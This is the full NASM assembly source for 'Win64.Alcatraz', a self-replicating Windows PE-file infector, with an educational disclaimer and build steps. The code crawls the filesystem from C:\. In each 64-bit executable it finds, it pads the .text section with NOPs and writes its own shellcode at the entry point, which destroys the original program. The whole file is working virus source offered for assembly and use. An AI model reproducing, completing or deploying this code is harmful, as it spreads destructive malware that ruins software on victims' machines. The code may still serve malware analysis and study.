; Author: Angelo Frasca Caccia (lem0nSec_)
; Date: 04/01/2023
; Title: Win64.Alcatraz - A simple PE-file infector to explain how self-replicating code works



; [ DISCLAIMER ]
; The Author of this code is not responsible for its usage.
; The purpose of this code is purely educational and academic.
; Be aware that running this program may harm the integrity of your system.


; [ Motivation ]
;
; I developed this code just to improve
; my low-level programming skills, as well as my
; understanding and management of PE files.



; [ Infection phases ]
;
; 1) Save virus entrypoint in rbx
;		The rbx register can now be used to reference specific virus parts ([rbx + <int>])
;
; 2) Resolve Kernel32.dll addresses and save them in the heap memory
; 		Kernel32AddressTable will be stored in r15. Calling a winapi just comes down to
;		calling QWORD r15 + <int>
;
; 3) Search for executable files starting from C:\
; 		Check if the file meets specific criteria, so that it can be defined as a
; 		64bit - PE executable image (.exe)
; 		If no valid .exe is found in the current directory, then enable 'directory_mode' (r12 == 1)
; 		and go down a directory. The program will then search for a valid file in the new path
;
; 4) Once a valid file is found, infect it
; 		The program pads the entire .text section with nops and appends the signature 'alca' at the
; 		very beginning of it. Then this shellcode instructions are copied past the file entrypoint
; 		This process takes place in the heap memory of the virus. The infected copy will then
; 		overwrite the actual file.
;
; 5) The program exits when the entire filesystem has been analysed
; 		Once the C:\ directory is reached agains, the normal control flow will try to go back one directory
; 		This will make SetCurrentDirectoryA to return 0 (error), which will signal the program to call the
;		_clearAndTerminate procedure and exit out
;



; [ Assembling Instructions ]
; 
; 1) 	nasm -f win64 alcatraz.asm -o alcatraz.obj
; 2) 	golink /entry _saveEntryPoint /console alcatraz.obj kernel32.dll
; 3) 	Open the file with a debugger and edit the first instruction
; 		from 'lea rbx, [rax]' to 'lea rbx, [rip]'
;
; NB: nasm warnings are irrelevant
;


[BITS 64]

section .text

	global _saveEntryPoint


_saveEntryPoint:
	lea 	rbx, [rax]						; rax needs to be changed to rip
	nop
	nop
	nop
	nop
	sub 	rbx, 0x7
	jmp 	_getKernel32AddressTable


_kernel32AddressTable:

	k32LocalAlloc		db	"LocalAlloc", 0			; + 0
	
	k32LocalFree		db	"LocalFree", 0			; + 8

	k32ExitProcess		db	"ExitProcess", 0		; + 16

	k32CreateFileA		db	"CreateFileA", 0		; + 24

	k32GetFileSize		db	"GetFileSize", 0		; + 32

	k32ReadFile		db	"ReadFile", 0			; + 40

	k32WriteFile		db	"WriteFile", 0			; + 48

	k32CloseHandle		db	"CloseHandle", 0		; + 56

	k32FindFirstFileA	db	"FindFirstFileA", 0		; + 64

	k32FindNextFileA	db	"FindNextFileA", 0		; + 72

	k32SetCurrentDirectoryA	db	"SetCurrentDirectoryA", 0	; + 80

	k32GetCurrentDirectory	db	"GetCurrentDirectoryA", 0	; + 88

	k32GetModuleHandleA	db	"GetModuleHandleA", 0		; + 96


_resources:

	name			db	".text", 0

	target			db	"*", 0

	dir			db	"C:\", 0

	dotdot			db	"..", 0

	signature		db	"alca", 0



_getKernel32AddressTable:
	
	call 	_get_Kernel32_Handle		; get Kernel32.dll base address
	mov 	r12, rax			; *** r12: base addr kernel32.dll ***
	mov 	rcx, rax
	call 	_get_function_export		; get GetProcAddress address
	mov 	r13, rax			; *** r13: GetProcAddress ***


	lea 	rdx, [rbx + 0x10]
	call r13

	mov 	r15, rax			; *** r15: store LocalAlloc import for later use ***

	xor 	rcx, rcx
	mov 	rdx, rcx
	add 	rcx, 0x0040
	add 	rdx, 104 
	call 	rax				; LocalAlloc(LPTR, 104)

	mov 	r14, rax			; *** r14: address Kernel32AddressTable (heap memory allocation where all winapi will be stored) ***
	mov 	rax, r15
	call 	_prepareStoreAddress		; store LocalAlloc address in Kernel32AddressTable

	mov 	rcx, r12
	lea 	rdx, [rbx + 0x1B]
	call 	r13				; GetProcAddress("LocalFree")
	call 	_prepareStoreAddress		; store LocalFree address

	mov 	rcx, r12
	lea 	rdx, [rbx + 0x25]
	call 	r13				; get ExitProcess
	call 	_prepareStoreAddress

	mov 	rcx, r12
	lea 	rdx, [rbx + 0x31]
	call 	r13				; get CreateFileA
	call 	_prepareStoreAddress

	mov 	rcx, r12
	lea 	rdx, [rbx + 0x3D]
	call 	r13				; get GetFileSize
	call 	_prepareStoreAddress

	mov 	rcx, r12
	lea 	rdx, [rbx + 0x49]
	call 	r13				; get ReadFile
	call 	_prepareStoreAddress

	mov 	rcx, r12
	lea 	rdx, [rbx + 0x52]
	call 	r13				; get WriteFile
	call 	_prepareStoreAddress

	mov 	rcx, r12
	lea 	rdx, [rbx + 0x5C]
	call 	r13				; get CloseHandle
	call 	_prepareStoreAddress

	mov 	rcx, r12
	lea 	rdx, [rbx + 0x68]
	call 	r13				; get FindFirstFileA
	call 	_prepareStoreAddress

	mov 	rcx, r12
	lea 	rdx, [rbx + 0x77]
	call 	r13				; get FindNextFileA
	call 	_prepareStoreAddress

	mov 	rcx, r12
	lea 	rdx, [rbx + 0x85]
	call 	r13				; get SetCurrentDirectoryA
	call 	_prepareStoreAddress

	mov 	rcx, r12
	lea 	rdx, [rbx + 0x9A]
	call 	r13				; get GetCurrentDirectoryA
	call 	_prepareStoreAddress

	mov 	rcx, r12
	lea 	rdx, [rbx + 0xAF]
	call 	r13				; get GetModuleHandleA
	call 	_prepareStoreAddress


	xor 	rcx, rcx
	mov 	rdx, rcx
	mov 	r8, rcx
	mov 	r9, rcx
	mov 	r12, rcx
	mov 	r13, rcx
	mov 	r15, rcx
	mov 	rax, r14
	xor 	r14, r14
	jmp 	_begin


_prepareStoreAddress:
	mov 	r9, rax
	xor 	r8, r8
	mov 	rdx, r8
	mov 	rcx, r14

_storeAddress:
	cmp 	QWORD [ds:rcx + rdx], r8
	jne 	_storeAddress_continueIncrement
	mov 	QWORD [ds:rcx + rdx], r9
	mov 	rax, rdx
	ret

_storeAddress_continueIncrement:
	add 	rdx, 8
	jmp 	_storeAddress



_get_Kernel32_Handle:
	mov 	rax, QWORD [gs:0x60]			; TEB address
	mov 	rax, [rax + 18h]			; Ldr address
	mov 	rax, [rax + 20h]			; InMemoryOrderModuleList address
	mov 	rax, [rax]				; skip current module
	mov 	rax, [rax]				; skip ntdll.dll (ntdll.dll always at the second position)
	mov 	rax, [rax + 20h]			; kernel32.dll base address
	ret

_get_function_export:
	
	test 	rcx, rcx
	jz 		_returnError			; rcx contains kernel32.dll base address

	mov 	eax, [rcx + 3Ch]			; IMAGE_DOS_HEADER -> e_lfanew
	add 	rax, rcx				; IMAGE_NT_HEADER
	lea 	rax, [rax + 18h]			; IMAGE_OPTIONAL_HEADER
	lea 	rax, [rax + 70h]			; IMAGE_DATA_DIRECTORY
	lea 	rax, [rax + 0h]				; IMAGE_DATA_DIRECTORY[IMAGE_DATA_EXPORT_DIRECTORY]

	mov 	edx, [rax]
	lea 	rax, [rdx + rcx]			; base of IMAGE_DATA_EXPORT_DIRECTORY

	mov 	edx, [rax + 18h]			; NumberOfNames
	mov 	r8d, [rax + 20h]			; AddressOfNames
	lea 	r8, [rcx + r8]

	mov 	r10, 41636f7250746547h
	mov 	r11, 0073736572646441h


_loop:
	
	mov 	r9d, [r8]
	lea 	r9, [rcx + r9]				; pointer to function name
	cmp 	r10, [r9]
	jnz 	_adjust_loop
	cmp 	r11, [r9 + 7]
	jnz 	_adjust_loop

	neg 	rdx
	mov 	r10d, [rax + 18h]
	lea 	rdx, [r10 + rdx]
	mov 	r10d, [rax + 24h]
	lea 	r10, [rcx + r10]
	movzx 	rdx, WORD [r10 + rdx * 2]
	mov 	r10d, [rax + 1Ch]   			; AddressOfFunctions
	lea 	r10, [rcx + r10]

	mov 	r10d, [r10 + rdx * 4]			; r10 = offset of possible func addr

; Check for forwarded function
	mov 	edx, [rax + 0]				; rdx = VirtualAddress
	cmp 	r10, rdx
	jb 		_returnError

	mov 	r11d, [rax + 4]				; r11 = Size
	add 	r11, rdx
	cmp 	r10, r11

	mov 	r11d, [rax + 4]				; r11 = Size
	add 	r11, rdx
	cmp 	r10, r11
	jae 	_returnError

	lea		rax, [rcx + r10]        	; Got our func addr!
	ret


_adjust_loop:
	
	add 	r8, 4
	dec 	rdx
	jnz 	_loop


;-------------------------------------------;
; Here's where the actual program starts    ;
;-------------------------------------------;

_begin:

	push	rsp
	mov 	rbp, rsp
	sub 	rsp, 0x120

	mov 	r15, rax				; *** r15: Kernel32AddressTable ***
	xor 	rax, rax

	lea 	rcx, [rbx + 0xC8]
	call 	QWORD [ds:r15 + 80]			; SetCurrentDirectoryA('C:\')

;-----------------------------------------------------------;
; DirectoryData_storage will be a heap allocation where     ;
; a HANDLE and WIN32_FIND_DATAA QWORDS pairs will be stored ;
; whenever we go down a directory                           ;
;-----------------------------------------------------------;

	xor 	rcx, rcx
	mov 	rdx, rcx
	add 	rcx, 0x0040
	add 	rdx, 400				; 16 * 25 = 400 (can go 25 directories deep)
	call 	QWORD [ds:r15]				; DirectoryData_storage = LocalAlloc(LPTR, 400)
	mov 	QWORD [ss:rsp + 104], rax



_allocate_win32_find_dataa_struct:
	xor 	rcx, rcx
	mov 	rdx, rcx
	add 	rcx, 0x0040
	add 	rdx, 328
	call 	QWORD [ds:r15 + 0]
	mov 	r14, rax 				; *** r14: WIN32_FIND_DATAA struct ***



;-----------------------------------------------------------;
; Get information on the first file in the current directory;
;-----------------------------------------------------------;
	
	lea 	rcx, [rbx + 0xC6]
	mov 	rdx, r14
	call 	QWORD [ds:r15 + 64]			; HANDLE hFile = FindFirstFileA("*", &win32_find_dataa_struct)
	mov 	r13, rax 				; *** r13: hFile (this handle is for finding files) (NB: can't be used for read/write purposes!!!) ***
	cmp 	r12, 1
	jz	_changeDirectory
	jmp	_openCurrentFile


_closeHandleFile:

	mov 	rcx, r12
	call 	QWORD [ds:r15 + 56]			; CloseHandle(hFile)


_findNextFile:
	
	mov 	rcx, r13
	mov 	rdx, r14
	call 	QWORD [ds:r15 + 72]			; HANDLE hFile = FindNextFileA(hFile, &win32_find_dataa_struct)
	cmp 	rax, 0 
	jz	_prepareChangeDirectory_prepareExit
	cmp 	r12, 1
	jz	_changeDirectory


_openCurrentFile:

	lea 	rcx, [r14 + 44]
	mov 	rdx, 0x00000000C0000000
	xor 	r8, r8
	mov 	r9, r8 
	mov 	QWORD [ss:rsp + 0x20], 0x4
	mov 	DWORD [ss:rsp + 0x28], 0x80
	mov 	QWORD [ss:rsp + 0x30], r8
	call 	QWORD [ds:r15 + 24]	; CreateFileA(win32_find_dataa->fileName, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
	cmp 	rax, 0xFFFFFFFFFFFFFFFF
	jz	_findNextFile
	mov 	r12, rax			; *** r12: actual HANDLE hFile. We have read/write permissions over the file with this handle ***


;-----------------;
; Check file size ;
;-----------------;

	mov 	rcx, r12
	xor 	rdx, rdx
	call 	QWORD [ds:r15 + 32]		; GetFileSize(hFile, NULL)
	cmp 	rax, 0xFFFFFFFFFFFFFFFF 	; if the size is invalid (INVALID_FILE_SIZE) ...
	jz	_closeHandleFile		; ... go back and close the handle
	mov 	rdi, rax 			; *** rdi: size of target file ***


;-------------------------------------------------------------------------------;
; Allocate memory in the heap to copy the opened file.. 			;
; ... then check if the file meets the following criteria:			;
; 										;
; 1) The first WORD must be equal to 'MZ'					;
; 2) Base of file + 0x3C (SIGNATURE) must be equal to 'PE'			;
; 3) WORD SIGNATURE + 4 must be equal to 0x8664 (64bit)				;
; 4) IMAGE_FILE_HEADER -> Characteristics must be less than 0x2000 (not a .dll)	;
; 5) Signature 'alca' must not present at the beginning of the .text 		;
;-------------------------------------------------------------------------------;

	xor 	rcx, rcx
	mov 	rdx, rcx
	add 	rcx, 0x0040
	add 	rdx, rdi
	call 	QWORD [ds:r15 + 0]		; LocalAlloc(LPTR, sizeof(target))
	mov 	rsi, rax 			; *** rsi: allocation where the file can be read into***
	
	mov 	rcx, r12
	mov 	rdx, rsi
	mov 	r8, rdi
	xor 	r9, r9 
	mov 	QWORD [ss:rsp + 0x20], r9
	call 	QWORD [ds:r15 + 40]		; ReadFile(HANDLE hFile, LPVOID buffer, DWORD nNumberOfBytesToRead, NULL, NULL)

	cmp 	DWORD [rsi], 0x00905A4D		; check if 'MZ'
	jne 	_freeCall

	xor 	rax, rax
	mov 	eax, [rsi + 3Ch]
	add 	rax, rsi

	cmp 	WORD [ds:rax], 0x4550 		; check if 'PE'
	jne 	_freeCall

	cmp 	WORD [ds:rax + 4], 0x8664	; check if 64bit
	jne 	_freeCall

	add 	rax, 16h
	mov 	rcx, rax 
	xor 	rax, rax 
	mov 	ax, WORD [ds:rcx]
	and 	rax, 0x2000
	cmp 	rax, 0 				; check if .exe
	jne 	_freeCall

	
	xor 	rax, rax
	mov 	eax, [rsi + 3Ch]
	add 	rax, rsi
	lea 	rax, [rax + 18h]
	lea 	rax, [rax + 0xf0]
	lea 	rax, [rax + 0xC]
	mov 	eax, DWORD [ds:rax]
	add 	rax, rsi
	cmp 	DWORD [ds:rax], 0x61636C61	; verify signature
	jz	_freeCall

	mov 	QWORD [ss:rsp + 120], r13	; store HANDLE hFile onto the stack for later use
	mov 	QWORD [ss:rsp + 112], r14	; store WIN32_FIND_DATAA struct onto the stack for later use
	

	xor 	r13, r13
	xchg 	rdi, r13			; *** r13 : size of target file ***
	push 	r12
	xor 	r12, r12
	add 	r12, 0x659 			; *** r12: size of this shellcode (hardcoded) ***
	xchg 	r14, rdi 
	pop 	r14				; *** r14: HANDLE hFile ***
	xor 	rdi, rdi 			; *** rdi: 0 ***

	

;-------------------------------------------------------;
; The actual infection starts here:			;
;							;
; 1) Get a pointer to .text section of the file		;
; 2) Pad the entire .text with nops			;
; 3) Get a pointer to the EntryPoint 			;
; 4) Copy this shellcode past the EntryPoint 		;
; 5) Overwrite the original file with the infected one  ;
;-------------------------------------------------------;

; Registers configuration at this moment:
; rbx: this_code entrypoint / rsi: &target_copy / r12: sizeof(this_code) / r13: sizeof(target) / r14: HANDLE hFile / r15: &k32AddressTable

	xor 	rax, rax
	mov 	eax, [rsi + 3Ch]
	add 	rax, rsi
	lea 	rax, [rax + 18h]
	lea 	rax, [rax + 0xf0]
	lea 	rax, [rax + 0xC]
	mov 	edi, DWORD [ds:rax]		; *** rdi: .text VirtualAddress ***
	lea 	rax, [rax + 4]
	mov 	eax, DWORD [ds:rax]		; *** rax: .text size ***
	lea 	rdi, [rsi + rdi]		; *** rdi: pointer to .text ***
	mov 	rcx, rdi
	mov 	rdx, rax
	xor 	rax, rax
	mov 	DWORD [rcx], 0x61636C61		; write signature 'alca'
	add 	rax, 4

_padTextSection:
	mov 	BYTE [ds:rcx + rax], 0x90 	; pad .text section
	inc 	rax
	cmp 	rax, rdx
	jne 	_padTextSection

	xor 	rax, rax
	mov 	eax, [rsi + 3Ch]
	add 	rax, rsi
	lea 	rax, [rax + 18h]
	lea 	rax, [rax + 10h]
	mov 	eax, DWORD [ds:rax]		; *** rax: target entrypoint ***
	lea 	rax, [rsi + rax]

	mov 	rcx, rax
	xor 	rax, rax
	mov 	rdx, rax

_copyShellcode1:
	mov 	dl, BYTE [ds:rbx + rax]
	mov 	BYTE [ds:rcx + rax], dl 	; copy this shellcode
	inc 	rax
	cmp 	rax, r12
	jne	_copyShellcode1

	mov 	rcx, r14
	call 	QWORD [ds:r15 + 56]		; Close old HANDLE used to read the file
	
	mov 	rcx, QWORD [ss:rsp + 112]
	lea 	rcx, [rcx + 44]			; WIN32_FIND_DATAA->fileName
	mov 	rdx, 0x00000000C0000000
	xor 	r8, r8
	mov 	r9, r8
	mov 	QWORD [ss:rsp + 0x20], 0x2
	mov 	DWORD [ss:rsp + 0x28], 0x80
	mov 	QWORD [ss:rsp + 0x30], r8
	call 	QWORD [ds:r15 + 24]	; CreateFileA(WIN32_FIND_DATAA->fileName, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
	
	mov 	r14, rax
	mov 	rcx, r14
	mov 	rdx, rsi
	mov 	r8, r13
	xor 	r9, r9
	mov 	QWORD [ss:rsp + 0x20], r9
	call 	QWORD [ds:r15 + 48]		; WriteFile(HANDLE hFile, LPVOID buffer, DWORD nNumberOfBytesToWrite, NULL, NULL)
	mov 	rcx, r14
	call 	QWORD [ds:r15 + 56]		; CloseFile(hFile)


;------------------------------------------------------------;
; Jump back and find the next file after the infection       ;
;------------------------------------------------------------;

	mov 	rcx, rsi
	call 	QWORD [ds:r15 + 8]		; LocalFree(target_allocation)
	mov 	r13, QWORD [ss:rsp + 120]	; *** r13: restore HANDLE hFile for finding programs ***
	mov 	r14, QWORD [ss:rsp + 112]	; *** r14: restore WIN32_FIND_DATAA struct ***
	jmp	_findNextFile


;-----------------------------------------------------------------;
; The _freeCall procedure is needed when an invalid file is found ;
;-----------------------------------------------------------------;

_freeCall:
	mov 	rcx, rsi 
	call 	QWORD [ds:r15 + 8]		; LocalFree(target_allocation)
	jmp	_closeHandleFile


_prepareChangeDirectory_prepareExit:

;---------------------------------------------------;
; Check if we're in 'directory mode' (r12 == 1)     ;
; + If this mode is set, then go back one directory ;
; - If it's not, then turn it on		    ;
;---------------------------------------------------;
	cmp 	r12, 1
	jz	_goBackDir

	xor 	r12, r12
	inc 	r12
	mov 	rcx, r14
	call 	QWORD [ds:r15 + 8]		; LocalFree(win32_find_dataa)
	jmp	_allocate_win32_find_dataa_struct


_changeDirectory:
	call 	_verifyDot
	
	cmp	rax, 0
	jz	_findNextFile

	lea 	rcx, [r14 + 44]
	call 	QWORD [r15 + 80]		; SetCurrentDirectoryA(directory)
	cmp	rax, 0
	jz	_findNextFile

	xor 	rax, rax
	mov 	r11, QWORD [ss:rsp + 104]	; *** r11: DirectoryData_storage ***
	call 	_storeDirectoryData

	dec 	r12
	jmp	_allocate_win32_find_dataa_struct



_verifyDot:
	xor 	rax, rax
	inc 	rax
	cmp 	WORD [ds:r14 + 44], 0x2E2E	; check if file is '..'
	jz	_returnError
	xor 	rcx, rcx
	add 	cl, BYTE [ds:r14 + 44]
	add 	cl, BYTE [ds:r14 + 45]
	cmp 	cl, 0x2E			; check if file is '.'
	jz	_returnError
	ret

_returnError:
	xor 	rax, rax 
	ret

_goBackDir:
	xor 	rcx, rcx
	lea 	rcx, [ds:rbx + 0xCC]		; rcx: '..'
	call 	QWORD [ds:r15 + 80]		; SetCurrentDirectory('..')
	cmp 	rax, 0
	jz	_clearAndTerminate

	xor 	rax, rax
	add 	rax, 384
	mov 	r11, QWORD [ss:rsp + 104]	; *** r11: DirectoryData_storage ***
	call 	_retrieveDirectoryData
	jmp	_findNextFile

_clearAndTerminate:
	xor 	rcx, rcx
	call 	QWORD [ds:r15 + 16]




;-------------------------------------------------------------------------------;
; The _storeDirectoryData will store the HANDLE hFile (used for reading)	;
; + the WIN32_FIND_DATAA struct for later use					;
; The _retrieveDirectoryData will do the opposite				;
;-------------------------------------------------------------------------------;
; Requirements (_storeDirectoryData)						;
; - rax has to be zero								;
; - r11 has to be a pointer to the DirectoryData_storage allocation		;
; - r13 has to contain the old HANDLE						;
; - r14 has to be a pointer to the old win32_find_dataa struct			;
;										;
; Requirements (_retrieveDirectoryData)						;
; - rax needs to be equal to sizeof(DirectoryData_storage) (320 at the moment)	;
; - r11 needs to be a pointer to DirectoryData_storage				;
;-------------------------------------------------------------------------------;

_storeDirectoryData:
	cmp 	QWORD [ds:r11 + rax], 0
	jne 	_addRax
	xchg 	QWORD [ds:r11 + rax], r13	; store previous HANDLE in DirectoryData_storage
	xchg 	QWORD [ds:r11 + rax + 8], r14	; store previous WIN32_FIND_DATAA struct in DirectoryData_storage
	ret

_addRax:
	add 	rax, 16 
	jmp 	_storeDirectoryData


_retrieveDirectoryData:
	cmp 	QWORD [ds:r11 + rax], 0
	jz 		_subRax
	
	xor 	r13, r13
	mov 	r14, r13
	xchg 	r13, QWORD [ds:r11 + rax]	; restore previous HANDLE in r13 and zero out the previously occupied space in DirectoryData_storage
	xchg 	r14, QWORD [ds:r11 + rax + 8]	; restore previous WIN32_FIND_DATAA struct and zero out the previously occupied space in DirectoryData_storage
	ret

_subRax:
	sub 	rax, 16
	jmp 	_retrieveDirectoryData
